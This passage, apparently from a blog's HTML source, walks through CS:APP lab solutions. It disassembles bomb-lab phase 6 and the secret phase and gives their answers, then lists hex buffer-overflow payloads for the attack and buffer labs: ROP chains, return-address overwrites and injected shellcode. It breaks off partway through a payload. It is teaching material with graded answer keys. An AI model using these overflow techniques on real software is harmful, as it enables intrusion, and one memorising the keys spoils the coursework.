│           0x004010f8      4154           push r12
│           0x004010fa      55             push rbp
│           0x004010fb      53             push rbx
│           0x004010fc      4883ec50       sub rsp, 0x50
│           0x00401100      4989e5         mov r13, rsp
│           0x00401103      4889e6         mov rsi, rsp                ; int64_t arg2
│           0x00401106      e851030000     call sym.read_six_numbers
│           0x0040110b      4989e6         mov r14, rsp
│           0x0040110e      41bc00000000   mov r12d, 0
│           ; CODE XREF from sym.phase_6 @ 0x401151(x)
│       ┌─&amp;gt; 0x00401114      4c89ed         mov rbp, r13
│       ╎   0x00401117      418b4500       mov eax, dword [r13]
│       ╎   0x0040111b      83e801         sub eax, 1
│       ╎   0x0040111e      83f805         cmp eax, 5                  ; 5
│      ┌──&amp;lt; 0x00401121      7605           jbe 0x401128
│      │╎   0x00401123      e812030000     call sym.explode_bomb
│      │╎   ; CODE XREF from sym.phase_6 @ 0x401121(x)
│      └──&amp;gt; 0x00401128      4183c401       add r12d, 1
│       ╎   0x0040112c      4183fc06       cmp r12d, 6                 ; 6
│      ┌──&amp;lt; 0x00401130      7421           je 0x401153
│      │╎   0x00401132      4489e3         mov ebx, r12d
│      │╎   ; CODE XREF from sym.phase_6 @ 0x40114b(x)
│     ┌───&amp;gt; 0x00401135      4863c3         movsxd rax, ebx
│     ╎│╎   0x00401138      8b0484         mov eax, dword [rsp + rax*4]
│     ╎│╎   0x0040113b      394500         cmp dword [rbp], eax
│    ┌────&amp;lt; 0x0040113e      7505           jne 0x401145
│    │╎│╎   0x00401140      e8f5020000     call sym.explode_bomb
│    │╎│╎   ; CODE XREF from sym.phase_6 @ 0x40113e(x)
│    └────&amp;gt; 0x00401145      83c301         add ebx, 1
│     ╎│╎   0x00401148      83fb05         cmp ebx, 5                  ; 5
│     └───&amp;lt; 0x0040114b      7ee8           jle 0x401135
│      │╎   0x0040114d      4983c504       add r13, 4
│      │└─&amp;lt; 0x00401151      ebc1           jmp 0x401114
│      │    ; CODE XREF from sym.phase_6 @ 0x401130(x)
│      └──&amp;gt; 0x00401153      488d742418     lea rsi, [var_18h]
│           0x00401158      4c89f0         mov rax, r14
│           0x0040115b      b907000000     mov ecx, 7
│           ; CODE XREF from sym.phase_6 @ 0x40116d(x)
│       ┌─&amp;gt; 0x00401160      89ca           mov edx, ecx
│       ╎   0x00401162      2b10           sub edx, dword [rax]
│       ╎   0x00401164      8910           mov dword [rax], edx
│       ╎   0x00401166      4883c004       add rax, 4
│       ╎   0x0040116a      4839f0         cmp rax, rsi
│       └─&amp;lt; 0x0040116d      75f1           jne 0x401160
│           0x0040116f      be00000000     mov esi, 0
│       ┌─&amp;lt; 0x00401174      eb21           jmp 0x401197
│       │   ; CODE XREFS from sym.phase_6 @ 0x40117f(x), 0x4011a9(x)
│     ┌┌──&amp;gt; 0x00401176      488b5208       mov rdx, qword [rdx + 8]
│     ╎╎│   0x0040117a      83c001         add eax, 1
│     ╎╎│   0x0040117d      39c8           cmp eax, ecx
│     └───&amp;lt; 0x0040117f      75f5           jne 0x401176
│     ┌───&amp;lt; 0x00401181      eb05           jmp 0x401188
│     │╎│   ; CODE XREF from sym.phase_6 @ 0x40119d(x)
│    ┌────&amp;gt; 0x00401183      bad0326000     mov edx, obj.node1          ; 0x6032d0 ; &amp;quot;L\x01&amp;quot;
│    ╎│╎│   ; CODE XREF from sym.phase_6 @ 0x401181(x)
│    ╎└───&amp;gt; 0x00401188      4889547420     mov qword [rsp + rsi*2 + 0x20], rdx
│    ╎ ╎│   0x0040118d      4883c604       add rsi, 4
│    ╎ ╎│   0x00401191      4883fe18       cmp rsi, 0x18               ; 24
│    ╎┌───&amp;lt; 0x00401195      7414           je 0x4011ab
│    ╎│╎│   ; CODE XREF from sym.phase_6 @ 0x401174(x)
│    ╎│╎└─&amp;gt; 0x00401197      8b0c34         mov ecx, dword [rsp + rsi]
│    ╎│╎    0x0040119a      83f901         cmp ecx, 1                  ; 1
│    └────&amp;lt; 0x0040119d      7ee4           jle 0x401183
│     │╎    0x0040119f      b801000000     mov eax, 1
│     │╎    0x004011a4      bad0326000     mov edx, obj.node1          ; 0x6032d0 ; &amp;quot;L\x01&amp;quot;
│     │└──&amp;lt; 0x004011a9      ebcb           jmp 0x401176
│     │     ; CODE XREF from sym.phase_6 @ 0x401195(x)
│     └───&amp;gt; 0x004011ab      488b5c2420     mov rbx, qword [var_20h]
│           0x004011b0      488d442428     lea rax, [var_28h]
│           0x004011b5      488d742450     lea rsi, [var_50h]
│           0x004011ba      4889d9         mov rcx, rbx
│           ; CODE XREF from sym.phase_6 @ 0x4011d0(x)
│       ┌─&amp;gt; 0x004011bd      488b10         mov rdx, qword [rax]
│       ╎   0x004011c0      48895108       mov qword [rcx + 8], rdx
│       ╎   0x004011c4      4883c008       add rax, 8
│       ╎   0x004011c8      4839f0         cmp rax, rsi
│      ┌──&amp;lt; 0x004011cb      7405           je 0x4011d2
│      │╎   0x004011cd      4889d1         mov rcx, rdx
│      │└─&amp;lt; 0x004011d0      ebeb           jmp 0x4011bd
│      │    ; CODE XREF from sym.phase_6 @ 0x4011cb(x)
│      └──&amp;gt; 0x004011d2      48c742080000.  mov qword [rdx + 8], 0
│           0x004011da      bd05000000     mov ebp, 5
│           ; CODE XREF from sym.phase_6 @ 0x4011f5(x)
│       ┌─&amp;gt; 0x004011df      488b4308       mov rax, qword [rbx + 8]
│       ╎   0x004011e3      8b00           mov eax, dword [rax]
│       ╎   0x004011e5      3903           cmp dword [rbx], eax
│      ┌──&amp;lt; 0x004011e7      7d05           jge 0x4011ee
│      │╎   0x004011e9      e84c020000     call sym.explode_bomb
│      │╎   ; CODE XREF from sym.phase_6 @ 0x4011e7(x)
│      └──&amp;gt; 0x004011ee      488b5b08       mov rbx, qword [rbx + 8]
│       ╎   0x004011f2      83ed01         sub ebp, 1
│       └─&amp;lt; 0x004011f5      75e8           jne 0x4011df
│           0x004011f7      4883c450       add rsp, 0x50
│           0x004011fb      5b             pop rbx
│           0x004011fc      5d             pop rbp
│           0x004011fd      415c           pop r12
│           0x004011ff      415d           pop r13
│           0x00401201      415e           pop r14
└           0x00401203      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;read_six_numbers()&lt;/code&gt; from input string.&lt;/p&gt;
&lt;p&gt;A loop:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; r12d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; r12d &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;; r12d&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;r13 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) explode_bomb();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ebx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r12d; ebx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; ebx&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;r13 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; rsp[ebx]) explode_bomb();
    }
    r13 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Therefore, 6 numbers must be a permutation of [0, 1, 2, 3, 4, 5].&lt;/p&gt;
&lt;p&gt;Calculations before check.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;num[i] = 7 - num[i]&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rsp;
&lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rax;
    rax &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
} &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(rax &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Re-sort the Nodes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; esi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; esi &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;; esi &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) {
    ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rsp[esi];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ecx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
        edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; node1;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; node1;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
            rdx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx.next;
            eax &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (eax &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; ecx);
    }
    var_20h[rsi &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Node is a One-way LinkedList&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;node1
    dd 14Ch 
    dd 1
    dq offset node2

node2
    dd 0A8h
    dd 2
    dq offset node3

node3
    dd 39Ch
    dd 3
    dq offset node4

node4
    dd 2B3h
    dd 4
    dq offset node5

node5
    dd 1DDh
    dd 5
    dq offset node6

node6
    dd 1BBh
    dd 6
    dq offset 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Re-linked.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;rcx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;var_20h;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    rdx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var_20h[i];
    rcx.next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx;
    rcx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdx;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Final check: nodes should be sorted by value.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;rbx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;var_20h;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (ebp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; ebp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ebp&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) {
    rax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rbx.next;
    eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rax.value;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (rbx.value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; eax) explode_bomb();
    rbx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rbx.next;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;node3 &amp;gt; node4 &amp;gt; node5 &amp;gt; node6 &amp;gt; node1 &amp;gt; node2&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Good work!  On to the next...
4 3 2 1 6 5
Congratulations! You&#39;ve defused the bomb!
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;secret-phase&#34;&gt;Secret Phase&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x004010f4]&amp;gt; s sym.secret_phase
[0x00401242]&amp;gt; pdf
            ; CALL XREF from sym.phase_defused @ 0x401630(x)
┌ 81: sym.secret_phase ();
│           0x00401242      53             push rbx
│           0x00401243      e856020000     call sym.read_line
│           0x00401248      ba0a000000     mov edx, 0xa                ; int base
│           0x0040124d      be00000000     mov esi, 0                  ; char * *endptr
│           0x00401252      4889c7         mov rdi, rax                ; const char *str
│           0x00401255      e876f9ffff     call sym.imp.strtol         ; long strtol(const char *str, char * *endptr, int base)
│           0x0040125a      4889c3         mov rbx, rax
│           0x0040125d      8d40ff         lea eax, [rax - 1]
│           0x00401260      3de8030000     cmp eax, 0x3e8              ; 1000
│       ┌─&amp;lt; 0x00401265      7605           jbe 0x40126c
│       │   0x00401267      e8ce010000     call sym.explode_bomb
│       │   ; CODE XREF from sym.secret_phase @ 0x401265(x)
│       └─&amp;gt; 0x0040126c      89de           mov esi, ebx                ; int64_t arg2
│           0x0040126e      bff0306000     mov edi, obj.n1             ; 0x6030f0 ; &amp;quot;$&amp;quot; ; int64_t arg1
│           0x00401273      e88cffffff     call sym.fun7
│           0x00401278      83f802         cmp eax, 2                  ; 2
│       ┌─&amp;lt; 0x0040127b      7405           je 0x401282
│       │   0x0040127d      e8b8010000     call sym.explode_bomb
│       │   ; CODE XREF from sym.secret_phase @ 0x40127b(x)
│       └─&amp;gt; 0x00401282      bf38244000     mov edi, str.Wow__Youve_defused_the_secret_stage_ ; 0x402438 ; &amp;quot;Wow! You&#39;ve defused the secret stage!&amp;quot; ; const char *s
│           0x00401287      e884f8ffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040128c      e833030000     call sym.phase_defused
│           0x00401291      5b             pop rbx
└           0x00401292      c3             ret

[0x00401242]&amp;gt; s sym.fun7
[0x00401204]&amp;gt; pdf
            ; CALL XREFS from sym.fun7 @ 0x401217(x), 0x40122d(x)
            ; CALL XREF from sym.secret_phase @ 0x401273(x)
┌ 62: sym.fun7 (int64_t arg1, signed int64_t arg2);
│           ; arg int64_t arg1 @ rdi
│           ; arg signed int64_t arg2 @ rsi
│           0x00401204      4883ec08       sub rsp, 8
│           0x00401208      4885ff         test rdi, rdi               ; arg1
│       ┌─&amp;lt; 0x0040120b      742b           je 0x401238
│       │   0x0040120d      8b17           mov edx, dword [rdi]        ; arg1
│       │   0x0040120f      39f2           cmp edx, esi                ; arg2
│      ┌──&amp;lt; 0x00401211      7e0d           jle 0x401220
│      ││   0x00401213      488b7f08       mov rdi, qword [rdi + 8]    ; int64_t arg1
│      ││   0x00401217      e8e8ffffff     call sym.fun7
│      ││   0x0040121c      01c0           add eax, eax
│     ┌───&amp;lt; 0x0040121e      eb1d           jmp 0x40123d
│     │││   ; CODE XREF from sym.fun7 @ 0x401211(x)
│     │└──&amp;gt; 0x00401220      b800000000     mov eax, 0
│     │ │   0x00401225      39f2           cmp edx, esi                ; arg2
│     │┌──&amp;lt; 0x00401227      7414           je 0x40123d
│     │││   0x00401229      488b7f10       mov rdi, qword [rdi + 0x10] ; int64_t arg1
│     │││   0x0040122d      e8d2ffffff     call sym.fun7
│     │││   0x00401232      8d440001       lea eax, [rax + rax + 1]
│    ┌────&amp;lt; 0x00401236      eb05           jmp 0x40123d
│    ││││   ; CODE XREF from sym.fun7 @ 0x40120b(x)
│    │││└─&amp;gt; 0x00401238      b8ffffffff     mov eax, 0xffffffff         ; -1
│    │││    ; CODE XREFS from sym.fun7 @ 0x40121e(x), 0x401227(x), 0x401236(x)
│    └└└──&amp;gt; 0x0040123d      4883c408       add rsp, 8
└           0x00401241      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Readline and convert to number.&lt;/p&gt;
&lt;p&gt;The number should smaller than 1001, and the result of &lt;code&gt;fun7()&lt;/code&gt; should be 2.&lt;/p&gt;
&lt;p&gt;Arg1 is a root of a tree.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;n1
    dq 24h
    dq offset n21
    dq offset n22
    dq 0

n21
    dq 8
    dq offset n31
    dq offset n32
    dq 0

n22
    dq 32h
    dq offset n33
    dq offset n34
    dq 0

n32
    dq 16h
    dq offset n43
    dq offset n44
    dq 0

n33
    dq 2Dh
    dq offset n45
    dq offset n46
    dq 0

n31
    dq 6
    dq offset n41
    dq offset n42
    dq 0

n34
    dq 6Bh
    dq offset n47
    dq offset n48
    dq 0

n45
    dq 28h
    dq 0
    dq 0
    dq 0

n41
    dq 1
    dq 0
    dq 0
    dq 0

n47
    dq 63h
    dq 0
    dq 0
    dq 0

n44
    dq 23h
    dq 0
    dq 0
    dq 0

n42
    dq 7
    dq 0
    dq 0
    dq 0

n43
    dq 14h
    dq 0
    dq 0
    dq 0

n46
    dq 2Fh
    dq 0
    dq 0
    dq 0

n48
    dq 3E9h
    dq 0
    dq 0
    dq 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The tree:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
                      0x24
          v------------|------------v
          8                        0x32
    v-----|------v            v-----|------v
    6           0x16         0x2d         0x6b
v---|---v    v---|---v    v---|---v    v---|---v
1       7   0x14    0x23 0x28    0x2f 0x63   0x3e9
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In fun7:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; root;
rsi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input_num;
edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; root.value;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (edx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; rsi) {
    rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdi.lchild;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fun7&lt;/span&gt;(rdi, rsi);
}
eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (edx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; esi) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; eax;
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rdi.rchild;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; fun7(rdi, rsi);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The target is 2, so we need:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ret 0
ret 1 + 2 * 0
ret 2 * (1 + 2 * 0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Therefore, the input should be 22.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Border relations with Canada have never been better.
Phase 1 defused. How about the next one?
1 2 4 8 16 32
That&#39;s number 2.  Keep going!
7 327
Halfway there!
0 0 DrEvil
So you got that one.  Try this one.
ionefg
Good work!  On to the next...
4 3 2 1 6 5
Curses, you&#39;ve found the secret phase!
But finding it and solving it are quite different...
22
Wow! You&#39;ve defused the secret stage!
Congratulations! You&#39;ve defused the bomb!
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;lab3-attack-lab&#34;&gt;Lab3 Attack-lab&lt;/h2&gt;
&lt;p&gt;直接使用 ROP 打了&lt;/p&gt;
&lt;h3 id=&#34;phase-1-1&#34;&gt;Phase 1&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
62 62 62 62 62 62 62 62
C0 17 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-2-1&#34;&gt;Phase 2&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61
62 62 62 62 62 62 62 62
1b 14 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
EC 17 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-3-1&#34;&gt;Phase 3&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;35 39 62 39 39 37 66 61 
00 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61
62 62 62 62 62 62 62 62
1b 14 40 00 00 00 00 00
78 dc 61 55 00 00 00 00
FA 18 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Phase 4 和 5 不知道为什么打不通，跳过了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;lab4-buffer-lab&#34;&gt;Lab4 Buffer-lab&lt;/h2&gt;
&lt;p&gt;感觉像另一个版本的 Attack lab&lt;/p&gt;
&lt;h3 id=&#34;phase-0&#34;&gt;Phase 0&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
62 62 62 62
18 8C 04 08
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-1-2&#34;&gt;Phase 1&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
62 62 62 62
42 8C 04 08
63 63 63 63
8e 3e aa 69
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-2-2&#34;&gt;Phase 2&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;movl $0x69aa3e8e, 0x0804D100
push $0x08048C9D
ret
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;c7 05 00 d1 04 08 8e
3e aa 69
68 9d 8c 04 08
c3

61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
62 62 62 62
28 3d 68 55
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-3-2&#34;&gt;Phase 3&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov $0x69aa3e8e, %eax
mov $0x55555555, %ebp
push $0x08048DBE
ret
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b8 8e 3e aa 69
bd 80 3d 68 55
68 be 8d 04 08
c3

61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
61 61 61 61
62 62 62 62
28 3d 68 55
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-4-1&#34;&gt;Phase 4&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;mov $0x69aa3e8e, %eax
mov %esp, %ebp
add $0x28, %ebp
push $0x08048DBE
ret
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b8 8e 3e aa 69
89 e5
83 c5 28
68 be 8d 04 08
c3

61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61 
